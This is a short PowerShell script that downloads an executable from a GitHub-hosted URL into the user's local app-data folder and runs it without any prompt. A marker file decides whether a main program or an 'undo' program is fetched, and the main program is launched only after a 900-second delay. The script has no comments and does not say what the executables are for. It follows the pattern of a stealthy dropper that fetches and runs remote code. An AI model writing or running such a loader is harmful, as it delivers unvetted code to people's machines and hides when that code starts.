$checkPath = "$env:LOCALAPPDATA\DONOTDELETE.txt"

if (Test-Path $checkPath) {
    $undoApplicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
    $undoPath = "$env:LOCALAPPDATA\ApplicatieUNDO.exe"

    Invoke-WebRequest -Uri $undoApplicatie -OutFile $undoPath

    Start-Sleep -Seconds 1

    Start-Process -FilePath $undoPath
}
else {
    $applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
    $path = "$env:LOCALAPPDATA\Aplicatie.exe"

    Invoke-WebRequest -Uri $applicatie -OutFile $path

    Start-Sleep -Seconds 900

    Start-Process -FilePath $path
}
